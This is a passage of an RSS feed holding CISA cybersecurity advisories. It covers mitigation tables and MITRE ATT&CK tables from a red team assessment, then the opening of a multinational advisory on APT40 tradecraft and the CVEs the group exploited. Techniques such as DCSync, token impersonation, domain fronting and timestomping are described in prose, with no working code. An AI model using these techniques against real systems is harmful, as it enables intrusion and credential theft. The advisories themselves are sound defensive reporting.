</ul>
</td>
</tr>
<tr>
<td>Insufficient Network Segmentation</td>
<td>
<ul>
<li>Apply the principle of least privilege to limit the exposure of systems and services in the demilitarized zone (DMZ).</li>
<li>Segment the DMZ based on the sensitivity of systems and services as well as the internal network [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NetworkSegmentation2F\" title=\"Network Segmentation (2.F)\">CPG 2.F</a>].</li>
<li>Segment networks to protect assets and workstations from direct exposure to the internet by considering the criticality of the asset to business functions, sensitivity of the data traversing the asset, and requirements for internet access to the asset.</li>
<li>Implement and regularly test firewalls, access control lists, and intrusion prevention systems.</li>
<li>Take advantage of opportunities to create natural network segmentation. Securely configured VPNs used for remote laptops, for instance, create an easy place to filter and monitor incoming traffic.</li>
</ul>
</td>
</tr>
<tr>
<td>Trust relationships between domains were overly permissive</td>
<td>
<ul>
<li>Restrict network connectivity (ingress and egress) to only necessary services between trusted domains [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SeparatingUserandPrivilegedAccounts2E\" title=\"Separating User and Privileged Accounts (2.E)\">CPG 2.E</a>].</li>
<li>Regularly monitor privileged access via Foreign Security Principals (FSPs).</li>
</ul>
</td>
</tr>
<tr>
<td>Defensive activity was not sufficiently isolated</td>
<td>
<ul>
<li>Perform network defense investigations out-of-band [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>].</li>
<li>Conduct regular security audits and penetration testing by internal and external parties.</li>
<li>Develop and implement a comprehensive Incident Response Plan (IRP) and conduct regular drills and simulations [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#IncidentResponseIRPlans2S\" title=\"Incident Response (IR) Plans (2.S)\">CPG 2.S</a>].</li>
</ul>
</td>
</tr>
<tr>
<td>IDM solutions were not fully understood and utilized</td>
<td>
<ul>
<li>Enroll all accounts in IDM solutions and test against common credential manipulation techniques.</li>
<li>Integrate the IDM solution with other systems and applications, allowing for the streamlining of workflows.</li>
</ul>
</td>
</tr>
<tr>
<td>Insufficient role-based host segmentation</td>
<td>
<ul>
<li>Establish Role-Based Access Controls (RBAC) to systematically assign permissions based on job functions [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SeparatingUserandPrivilegedAccounts2E\" title=\"Separating User and Privileged Accounts (2.E)\">CPG 2.E</a>].</li>
<li>Implement a comprehensive security model incorporating micro-segmentation at the host level.</li>
</ul>
</td>
</tr>
<tr>
<td>Failure to monitor EDR alerts daily</td>
<td>
<ul>
<li>Develop and document Standard Operating Procedures (SOPs) for handling EDR alerts [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#IncidentPlanningandPreparedness5A\" title=\"Incident Planning and Preparedness (5.A)\">CPG 5.A</a>].</li>
<li>Establish and maintain incident response playbooks.</li>
<li>Conduct regular audits and reviews of the EDR alert handling process.</li>
</ul>
</td>
</tr>
<tr>
<td>Host artifacts were overly trusted</td>
<td>
<ul>
<li>Operationalize and deploy File Integrity Monitoring (FIM) solutions.</li>
<li>Regularly review and adjust access permissions, adhering to the principle of least privilege [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SeparatingUserandPrivilegedAccounts2E\" title=\"Separating User and Privileged Accounts (2.E)\">CPG 2.E</a>].</li>
<li>Establish proper forensic processes to ensure integrity.</li>
</ul>
</td>
</tr>
<tr>
<td>Bureaucracy and decentralization of network defenders hampered communication and consistency</td>
<td>
<ul>
<li>Introduce cross-training initiatives to cultivate a collaborative culture.</li>
<li>Encourage the establishment of cross-functional projects.</li>
<li>Utilize collaboration platforms that seamlessly integrate various tools and systems.</li>
</ul>
</td>
</tr>
<tr>
<td>Insufficient internal incident response report&nbsp;</td>
<td>
<ul>
<li>Promote a culture of ongoing improvement while also fostering a proactive approach among employees to promptly report suspicious activities.</li>
<li>Treat suspected incidents of compromise as a confirmed breach, and account for a threat actor’s ability to move laterally when defining the scope of incident response efforts.</li>
</ul>
</td>
</tr>
<tr>
<td>Focus on known/common IOCs</td>
<td>
<ul>
<li>Employ centralized logging and tool-agnostic detection methods.</li>
<li>Leverage threat intelligence feeds by integrating them into a SIEM tool.</li>
<li>Implement regular updates for IOCs and TTPs, with the capability for customization to address the specific threat landscape [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>].</li>
</ul>
</td>
</tr>
<tr>
<td>Detection rules were visible from compromised systems</td>
<td>
<ul>
<li>Integrate runtime detection mechanisms while removing world-readable configuration files from installer deployments where applicable.</li>
</ul>
</td>
</tr>
<tr>
<td>Insufficient restriction of admin tools</td>
<td>
<ul>
<li>Enhance security posture by implementing application allowlisting to ensure only trusted and approved applications are permitted [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#HardwareandSoftwareApprovalProcess2Q\" title=\"Hardware and Software Approval Process (2.Q)\">CPG 2.Q</a>].</li>
<li>Apply the principle of least privilege by granting users only the minimum level of access necessary to perform job functions.</li>
</ul>
</td>
</tr>
<tr>
<td>Insufficient tracking of software</td>
<td>
<ul>
<li>Conduct a comprehensive inventory of assets and establish a baseline for behavior [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#AssetInventory1A\" title=\"Asset Inventory (1.A)\">CPG 1.A</a>].</li>
<li>Utilize a Software Asset Management (SAM) solution that offers comprehensive tracking, reporting, and compliance management capabilities.</li>
<li>Deploy automated discovery and monitoring tools to continuously scan and identify new and existing software.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p>CISA recommends organizations implement the recommendations in Table 2 to mitigate other identified issues that can be uncovered through traditional penetration tests or red team assessments.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2: Recommendations to Mitigate Identified Issues</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Issue</strong></th>
<th role=\"columnheader\"><strong>Recommendation</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Accounts were overprivileged and the organization’s network contained unnecessary service accounts</td>
<td>
<ul>
<li>Apply the principle of least privilege when assigning permissions to user accounts. Audit existing group memberships, strip unnecessary privileges, and prune unnecessary nested groups/users.</li>
<li>Monitor for account lockout, especially on administrative accounts, and switch to a manual account unlock policy.</li>
<li>Increase monitoring for higher-risk accounts, such as service accounts, that are highly privileged and have a predictable pattern of behavior (e.g., scans that reliably run at a certain hour of the day).</li>
<li>Privileged users should have dedicated role-based user accounts and associated jump hosts to log into critical resources.</li>
</ul>
</td>
</tr>
<tr>
<td>Insufficient EDR configuration</td>
<td>
<ul>
<li>Ensure all hosts have a form of EDR installed.</li>
<li>Deploy an EDR capable of catching commonly known obfuscation or execution techniques.</li>
</ul>
</td>
</tr>
<tr>
<td>Insecure and insufficient credentials</td>
<td>
<ul>
<li>Ensure sensitive credentials and documents are not stored in an accessible place.</li>
<li>Mandate strong and complex passwords [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MinimumPasswordStrength2B\" title=\"Minimum Password Strength (2.B)\">CPG 2.B</a>]. For more information, see CISA’s <a href=\"https://www.cisa.gov/secure-our-world/require-strong-passwords\" title=\" Secure Our World: Require Strong Passwords\">Secure Our World: Require Strong Passwords.</a></li>
</ul>
</td>
</tr>
</tbody>
</table>
<p><strong>Note:</strong> The above mitigations apply to critical infrastructure organizations with on-premises or hybrid environments. CISA encourage all organizations to <strong>prioritize purchasing products from manufacturers who demonstrate secure by design principles</strong>, such as evidenced by follow-on publications from companies who have signed the&nbsp;<a href=\"https://www.cisa.gov/securebydesign/pledge\" title=\" Secure by Design Pledge\">Secure by Design Pledge</a>.</p>
<h4><strong>Software Manufacturers</strong></h4>
<p>CISA recognizes that insecure software is the root cause of many flaws; the responsibility should not rest on the end user. CISA urges software manufacturers to implement the following:</p>
<ul>
<li><a href=\"https://www.cisa.gov/resources-tools/resources/secure-design-alert-how-manufacturers-can-protect-customers-eliminating-default-passwords\" title=\"Secure by Design Alert: How Manufacturers Can Protect Customers by Eliminating Default Passwords\"><strong>Eliminate default passwords</strong></a><strong>&nbsp;</strong>and determine what password practices should be required (such as minimum password length and disallowing known breached passwords). Configure software to use more secure authentication schemes by default.</li>
<li><strong>Provide logging at no additional charge</strong>. Cloud services and on-premises products should commit to generating and storing security related logs at no additional cost.</li>
<li><strong>Work with security information and event management (SIEM) and security orchestration, automation, and response (SOAR) providers</strong>—in conjunction with customers—to understand how response teams use logs to investigate incidents. The goal is to develop logs that yield a comprehensive story of the event.</li>
<li><strong>Remove unnecessary software dependencies</strong>. Unnecessary software increases the attack surface available to adversaries and may introduce additional vulnerabilities. Mitigating these additional vulnerabilities requires significant investment, consuming resources like time, technical personnel, and adding to the level of security effort.</li>
</ul>
<p>These mitigations align with tactics provided in the joint guide <a href=\"https://www.cisa.gov/sites/default/files/2023-10/Shifting-the-Balance-of-Cybersecurity-Risk-Principles-and-Approaches-for-Secure-by-Design-Software.pdf\" title=\"Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software\">Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software</a>. CISA urges software manufacturers to take ownership of improving the security outcomes of their customers by applying these and other secure by design tactics. By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing security software and logs, monitoring, and making routine updates.&nbsp;</p>
<p>For more information on secure by design, see CISA’s <a href=\"https://www.cisa.gov/securebydesign\" title=\" Secure by Design\">Secure by Design</a> webpage. For more information on common misconfigurations and guidance on reducing their prevalence, see joint advisory <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-278a\" title=\"NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations\">NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations</a>.</p>
<h3>VALIDATE SECURITY CONTROLS</h3>
<p>In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see Tables 3–11).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h3>RESOURCES</h3>
<ul>
<li><a href=\"https://www.cisa.gov/resources-tools/resources/layering-network-security-through-segmentation-infographic\" title=\"Layering Network Security Through Segmentation Infographic\">Layering Network Security Through Segmentation</a></li>
<li><a href=\"https://www.cisa.gov/resources-tools/resources/ics-recommended-practices\" title=\"ICS Recommended Practices - Recommended Practice: Improving Industrial Control System Cybersecurity with Defense-in-Depth Strategies\">Recommended Practice: Improving Industrial Control System Cybersecurity with Defense-in-Depth Strategies</a></li>
<li><a href=\"https://www.cisa.gov/resources-tools/resources/phishing-guidance-stopping-attack-cycle-phase-one\" title=\"Phishing Guidance: Stopping the Attack Cycle at Phase One\">Phishing Guidance: Stopping the Attack Cycle at Phase One</a></li>
<li><a href=\"https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm\" title=\"BOFs\">BOFs</a></li>
<li><a href=\"https://blog.blacklanternsecurity.com/p/detecting-dcsync\" title=\"Detecting DCSync\">Detecting DCSync</a></li>
<li><a href=\"https://pentestlaboratories.com/2020/05/26/appdomainmanager-injection-and-detection/\" title=\"AppDomainManager Injection and Detection\">App Domain Hijacking Overview</a></li>
</ul>
<h3>DISCLAIMER</h3>
<p>The information in this report is being provided “as is” for informational purposes only. CISA does not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA.</p>
<h3>VERSION HISTORY</h3>
<p>July 11, 2024: Initial version.</p>
<h3>APPENDIX: MITRE ATT&amp;CK TACTICS AND TECHNIQUES</h3>
<p>See Tables 3–11 for all referenced threat actor tactics and techniques in this advisory.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3: Reconnaissance</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Search Victim-Owned Websites</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1594/\" title=\"Search Victim-Owned Websites\">T1594</a></td>
<td>CISA’s red team used open source tools and services to probe the organization’s internet-facing presence and gather information, including names, roles, and contact information.</td>
</tr>
<tr>
<td>Gather Victim Network Information: DNS</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1590/002/\" title=\"Gather Victim Network Information: DNS\">T1590.002</a></td>
<td>The red team gathered information about the organization’s DNS records, which revealed several details about the organization's internal network.</td>
</tr>
<tr>
<td>Gather Victim Identity Information: Employee Names</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1589/003/\" title=\"Gather Victim Identity Information: Employee Names\">T1589.003</a></td>
<td>CISA’s red team collected the assessed organizations’&nbsp;employee names to use their email addresses for specific targeting based on roles and responsibilities.</td>
</tr>
<tr>
<td>Gather Victim Org Information: Identity Roles</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1591/004/\" title=\"Gather Victim Org Information: Identity Roles\">T1591.004</a></td>
<td>CISA’s red team selected specific individuals from the assessed organization and targeted them with phishing payloads.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4: Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Application Layer Protocol: Web Protocols</td>
<td><a href=\"https://attack.mitre.org/techniques/T1071/001/\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a></td>
<td>The red team exploited <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21587\" title=\"CVE-2022-21587 Detail\">CVE-2022-21587</a> and ran a RAT that provided consistent C2 via open Transmission Control Protocol (TCP) ports.</td>
</tr>
<tr>
<td>Non-Standard Port</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1571/\" title=\"Non-Standard Port\">T1571</a></td>
<td>The red team used SSH over ports <code>80</code> and/or <code>443</code> when establishing outbound C2.</td>
</tr>
<tr>
<td>Proxy: Domain Fronting</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/004/\" title=\"Proxy: Domain Fronting\">T1090.004</a></td>
<td>CISA’s red team leveraged domain fronting to redirect and obfuscate their traffic.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5: Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Brute Force: Password Cracking</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/002/\" title=\"Brute Force: Password Cracking\">T1110.002</a></td>
<td>The red team cracked an account’s password by using a common wordlist.</td>
</tr>
<tr>
<td>OS Credential Dumping: DCSync</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/006/\" title=\"OS Credential Dumping: DCSync\">T1003.006</a></td>
<td>CISA’s red team pulled credentials for the domain via DCSync to gain full access to the domain.</td>
</tr>
<tr>
<td>Unsecured Credentials: Bash History</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1552/003/\" title=\"Unsecured Credentials: Bash History\">T1552.003</a></td>
<td>The red team obtained a password by searching a user’s bash command history, which provided further unprivileged access throughout the network.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6: Discovery</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Domain Trust Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1482/\" title=\"Domain Trust Discovery\">T1482</a></td>
<td>CISA’s red team inspected the assessed organization’s&nbsp;domain trust relationships through LDAP and identified potential connections in external organizations to which to move laterally.</td>
</tr>
<tr>
<td>File and Directory Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1083/\" title=\"File and Directory Discovery\">T1083</a></td>
<td>The red team data mined numerous internal servers and discovered one misconfigured share that contained plaintext usernames and passwords for several privileged service accounts.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7: Privilege Escalation</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Hijack Execution Flow: Path Interception by PATH Environment Variable</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1574/007/\" title=\"Hijack Execution Flow: Path Interception by PATH Environment Variable\">T1574.007</a></td>
<td>The red team hijacked the execution flow of a program that used a relative path instead of an absolute path, which enabled the capture of the account’s password.</td>
</tr>
<tr>
<td>Access Token Manipulation: Token Impersonation/Theft</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1134/001/\" title=\"Access Token Manipulation: Token Impersonation/Theft\">T1134.001</a></td>
<td>CISA’s red team impersonated the tokens of current users to exploit valid sessions and bypass the organization’s IDM.</td>
</tr>
<tr>
<td>Access Token Manipulation: Make and Impersonate Token</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1134/003/\" title=\"Access Token Manipulation: Make and Impersonate Token\">T1134.003</a></td>
<td>CISA’s red team created new tokens and logon sessions for accounts not registered with the IDM to escalate privileges.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8: Lateral Movement</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Services: SSH</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/004/\" title=\"Remote Services: SSH\">T1021.004</a></td>
<td>CISA’s red team used SSH with a valid account to move through the enclave.</td>
</tr>
<tr>
<td>Proxy</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a></td>
<td>The red team used a SOCKS proxy to avoid direct connections to their infrastructure and obscure the source of the malicious traffic.</td>
</tr>
<tr>
<td>Use Alternate Authentication Material: Pass the Hash</td>
<td><a href=\"https://attack.mitre.org/techniques/T1550/002/\" title=\"Use Alternate Authentication Material: Pass the Hash\">T1550.002</a></td>
<td>The red team’s operations were hindered by the organization’s IDM when it blocked the team's attempts to bypass system access controls using different hash types for authentication.</td>
</tr>
<tr>
<td>Use Alternate Authentication Material: Pass the Ticket</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1550/003/\" title=\"Use Alternate Authentication Material: Pass the Ticket\">T1550.003</a></td>
<td>CISA’s red team’s operations were hindered by the organization’s &nbsp;IDM when it blocked the team’s attempts to bypass system access controls using Kerberos tickets for authentication.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9: Collection</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Data from Local System</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1005/\" title=\"Data from Local System\">T1005</a></td>
<td>CISA’s red team searched each host for files containing sensitive or interesting information such as password hashes, account information, network configurations, etc.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10: Persistence</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Scheduled Task/Job: Cron</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/003/\" title=\"Scheduled Task/Job: Cron\">T1053.003</a></td>
<td>The red team used the <code>cron</code> utility to perform task scheduling and execute malicious code within Unix systems at specified times.</td>
</tr>
<tr>
<td>Scheduled Task/Job: At</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/002/\" title=\"Scheduled Task/Job: At\">T1053.002</a></td>
<td>CISA’s red team used the <code>at</code> utility to perform task scheduling and execute malicious code within Unix systems at a specified time and date.</td>
</tr>
<tr>
<td>Hijack Execution Flow: AppDomainManager</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1574/014/\" title=\"Hijack Execution Flow: AppDomainManager\">T1574.014</a></td>
<td>The red team executed malicious payloads by hijacking how the <code>.NETAppDomainManager</code> loads assemblies.</td>
</tr>
<tr>
<td>Valid Accounts: Domain Accounts</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a></td>
<td>CISA’s red team regularly used compromised valid domain accounts managed by Active Directory, giving access to resources of the domain.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 11: Defensive Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Masquerading: Masquerade Task or Service</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/004/\" title=\"Masquerading: Masquerade Task or Service\">T1036.004</a></td>
<td>The red team enumerated local files and running processes to gather information for their payloads and persistence mechanisms to appear as legitimate activity.</td>
</tr>
<tr>
<td>Obfuscated Files or Information</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1027/\" title=\"Obfuscated Files or Information\">T1027</a></td>
<td>CISA’s red team encrypted, encoded, and obfuscated their executables and C2 channels to evade defenses across the network.</td>
</tr>
<tr>
<td>File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1222/002/\" title=\"File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification\">T1222.002</a></td>
<td>The red team modified file permissions with <code>touch</code> and <code>chmod/chown</code> commands to obfuscate their activity and blend in with other files in the environment.</td>
</tr>
<tr>
<td>Indicator Removal: Timestomp</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1070/006/\" title=\"Indicator Removal: Timestomp\">T1070.006</a></td>
<td>CISA’s red team modified file timestamps to hide their operational activity.</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
") (pubDate nil "Tue, 09 Jul 2024 10:09:48 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/21739"))) ("People’s Republic of China (PRC) Ministry of State Security APT40 Tradecraft in Action" "<h2><strong>Overview</strong></h2>
<h3>Background</h3>
<p>This advisory, authored by the Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC), the United States Cybersecurity and Infrastructure Security Agency (CISA), the United States National Security Agency (NSA), the United States Federal Bureau of Investigation (FBI), the United Kingdom National Cyber Security Centre (NCSC-UK), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NCSC-NZ), the German Federal Intelligence Service (BND) and Federal Office for the Protection of the Constitution (BfV), the Republic of Korea’s National Intelligence Service (NIS) and NIS’ National Cyber Security Center, and Japan’s National Center of Incident Readiness and Strategy for Cybersecurity (NISC) and National Police Agency (NPA)—hereafter referred to as the “authoring agencies”—outlines a People’s Republic of China (PRC) state-sponsored cyber group and their current threat to Australian networks. The advisory draws on the authoring agencies’ shared understanding of the threat as well as ASD’s ACSC incident response investigations.</p>
<p>The PRC state-sponsored cyber group has previously targeted organizations in various countries, including Australia and the United States, and the techniques highlighted below are regularly used by other PRC state-sponsored actors globally. Therefore, the authoring agencies believe the group, and similar techniques remain a threat to their countries’ networks as well.</p>
<p>The authoring agencies assess that this group conduct malicious cyber operations for the PRC Ministry of State Security (MSS). The activity and techniques overlap with the groups tracked as Advanced Persistent Threat (APT) 40 (also known as Kryptonite Panda, GINGHAM TYPHOON, Leviathan and Bronze Mohawk in industry reporting). This group has previously been reported as being based in Haikou, Hainan Province, PRC and receiving tasking from the PRC MSS, Hainan State Security Department.[1]</p>
<p>The following Advisory provides a sample of significant case studies of this adversary’s techniques in action against two victim networks. The case studies are consequential for cybersecurity practitioners to identify, prevent and remediate APT40 intrusions against their own networks. The selected case studies are those where appropriate remediation has been undertaken reducing the risk of re-exploitation by this threat actor, or others. As such, the case studies are naturally older in nature, to ensure organizations were given the necessary time to remediate.</p>
<p>To download the PDF version of this report, visit the following link, <a href=\"https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/apt40-advisory-prc-mss-tradecraft-in-action\">APT40 Advisory</a>.</p>
<h3>Activity Summary</h3>
<p>APT40 has repeatedly targeted Australian networks as well as government and private sector networks in the region, and the threat they pose to our networks is ongoing. The tradecraft described in this advisory is regularly observed against Australian networks.</p>
<p>Notably, APT40 possesses the capability to rapidly transform and adapt exploit proof-of-concept(s) (POCs) of new vulnerabilities and immediately utilize them against target networks possessing the infrastructure of the associated vulnerability. APT40 regularly conducts reconnaissance against networks of interest, including networks in the authoring agencies’ countries, looking for opportunities to compromise its targets. This regular reconnaissance postures the group to identify vulnerable, end-of-life or no longer maintained devices on networks of interest, and to rapidly deploy exploits. APT40 continues to find success exploiting vulnerabilities from as early as 2017.</p>
<p>APT40 rapidly exploits newly public vulnerabilities in widely used software such as Log4J (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-44228\" title=\"CVE-2021-44228\">CVE-2021-44228</a>), Atlassian Confluence (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-31207\" title=\"CVE-2021-31207\">CVE-2021-31207</a>,&nbsp;<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-26084\" title=\"CVE-2021-26084\">CVE-2021-26084</a>) and Microsoft Exchange (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-31207\" title=\"CVE-2021-31207\">CVE-2021-31207</a>,&nbsp;<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-34523\" title=\"CVE-2021-34523\">CVE-2021-34523</a>,&nbsp;<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-34473\" title=\"CVE-2021-34473\">CVE-2021-34473</a>). ASD’s ACSC and the authoring agencies expect the group to continue using POCs for new high-profile vulnerabilities within hours or days of public release.</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/AA24-190A-apt40-figure-1_0.png?itok=a7YAYqy0\" width=\"1024\" height=\"685\" alt=\"Figure 1: TTP Flowchart for APT40 Activity\">


</div>
  </figure>
<p>Figure 1: TTP Flowchart for APT40 activity</p>
<p>This group appears to prefer exploiting vulnerable, public-facing infrastructure over techniques that require user interaction, such as phishing campaigns, and places a high priority on obtaining valid credentials to enable a range of follow-on activities. APT40 regularly uses web shells [<a href=\"https://attack.mitre.org/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>] for persistence, particularly early in the life cycle of an intrusion. Typically, after successful initial access APT40 focuses on establishing persistence to maintain access on the victim’s environment. However, as persistence occurs early in an intrusion, it is more likely to be observed in all intrusions—regardless of the extent of compromise or further actions taken.</p>
<h3>Notable Tradecraft</h3>
<p>Although APT40 has previously used compromised Australian websites as command and control (C2) hosts for its operations, the group have evolved this technique [<a href=\"https://attack.mitre.org/techniques/T1594/\" title=\"Search Victim-Owned Websites\">T1594</a>].</p>
